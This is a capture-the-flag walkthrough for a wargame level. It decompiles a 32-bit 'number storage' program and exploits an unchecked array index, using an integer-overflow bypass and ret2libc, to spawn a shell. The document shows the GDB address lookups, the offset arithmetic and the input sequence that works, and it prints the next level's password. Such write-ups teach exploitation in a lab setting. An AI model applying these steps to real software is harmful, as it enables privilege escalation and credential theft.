# Level07

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -m32 -z execstack source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void clear_stdin()
{
    unsigned char var = 0; // -0x9(%ebp)
    while (1)
    {
        var = getchar();
        if (var == '\n' || var == 0xff)
            break;
    }
}

unsigned int get_unum()
{
    unsigned int var1 = 0; // -0xc(%ebp)

    fflush(stdout);
    scanf("%u", &var1);
    clear_stdin();
    return var1;
}

void prog_timeout()
{
    exit(1); // Supposed to be a system call but cannot reproduce
}

int read_number(int *buffer)
{
    unsigned int var = 0; // -0xc(%ebp)

    printf(" Index: ");
    var = get_unum();
    printf(" Number at data[%u] is %u\n",var, buffer[var]);
    return 0;
}

int store_number(int *buffer)
{
    unsigned int nbr = 0; // -0x10(%ebp)
    unsigned int idx = 0; // -0xc(%ebp)

    printf(" Number: ");
    nbr = get_unum();
    printf(" Index: ");
    idx = get_unum();
    if ((idx % 3 == 0) || (idx >> 0x18 == 0xb7)) // 0x18 is 24 and 0xb7 is 183
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    else
    {
        buffer[idx] = nbr;
        return 0;
    }
    return 0;
}

int main(int argc, char **argv, char **env)
{
    int ret = 0; // 0x1b4(%esp)
    char cmd[20] = {0}; // 0x1b8(%esp) - 0x1c8(%esp)
    unsigned int buff[100] = {0}; // 0x24(%esp)

    while (*argv)
    {
        memset(*argv, 0, strlen(*argv));
        *argv++;
    }
    while (*env)
    {
        memset(*env, 0, strlen(*env));
        *env++;
    }

    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
    while (1)
    {
        printf("Input command: ");
        ret = 1;
        fgets(cmd, 20, stdin);
        cmd[strlen(cmd) - 1] = 0;

        if (strncmp(cmd, "store", 5) == 0)
            ret = store_number(buff);
        else if (strncmp(cmd, "read", 4) == 0)
            ret = read_number(buff);
        else if (strncmp(cmd, "quit", 4) == 0)
            break;

        if (ret)
            printf(" Failed to do %s command\n", cmd);
        else
            printf(" Completed %s command successfully\n", cmd);
        memset(cmd, 0, 20);
    }
    return 0;
}
```

Let's focus on the `store_number` function.  It reads input using the `scanf` function, which is known to be safe has a mechanism to limit the number of bytes read. However, our buffer is only 100 unsigned integers long, which means that we can overflow it by providing an index greater than 100. This will allow us to overwrite the return address of the `main` function.

### Ret2Libc
Check the [level01's walkthrough](../level01/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xf7e6aed0  system
[...]

# Exit
(gdb) info function exit
0xf7e5eb70  exit
[...]

# /bin/sh
(gdb) info proc mappings
[...]
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

To find our padding, Let's analyze the stack layout of our program:
```bash
(gdb) b *main+711 # Breaking before leave
Breakpoint 1 at 0x80489ea

(gdb) r # Run the program
Starting program: /home/users/level07/level07
[...]

Breakpoint 1, 0x080489ea in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xffffd440       0xffffd440
ebp            0xffffd628       0xffffd628
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 488 bytes:
```
0xffffd628 - 0xffffd440 = 1e8 (488 in decimal)
```	

Furthermore, we can see that our buffer is located at `0x24(%esp),%eax`. Since there is 488 bytes for the stack, our buffer will therefore require 452 bytes (488 - 36) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 456 bytes (452 + 4).

Anything written beyond those 456 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

Usually we'd just write the addresses to do a ret2libc, but in this case, we have to write the addresses in the buffer itself. The index (devided by 4 since it is an int buffer) will be the padding and the value will be the address.

Since we need 456 bytes of padding, we'll write the address of `system` at index 114 (456 / 4), the address of `exit` at index 115 and the address of `/bin/sh` at index 116. However, we can't use the index 114 because of this check:
```c
if ((idx % 3 == 0) || (idx >> 0x18 == 0xb7)) // 0x18 is 24 and 0xb7 is 183
{
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}
```

As you can see any index that is a multiple of 3 will be reserved for `wil`. But since this is an index of an int buffer, we can use some overflow to bypass this check, indeed our index will be multiplied by 4 to get the real address in memory, This is equivalent to a shift of 2 bits to the left as seen here:
```
0x08048741 <+148>:   shl    $0x2,%eax
```
Therefore, as long as the index is not a multiple of 3, and that after shifting 2 bits to the left, its value is equal to 114, then we'll be able to use it. Let's elaborate on this:
```
114: 00000000000000000000000001110010
1073741938: 01000000000000000000000001110010
2147483762: 10000000000000000000000001110010
3221225586: 11000000000000000000000001110010
```

Here is the 4 values that will be equal to 114 after shifting 2 bits to the left. 114 and 3221225586 are out of the question because they are multiples of 3. Therefore, we can use 1073741938 or 2147483762.

So let's convert all the values:
```
system: 0xf7e6aed0 => 4159090384
exit: 0xf7e5eb70 => 4159040368
/bin/sh: 0xf7f897ec => 4160264172

index / number:
116 / 4160264172 => /bin/sh
115 / 4159040368 => exit
1073741938 / 4159090384 => system
```

Let's run it:
```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

We are now level08! Let's move on to the next level.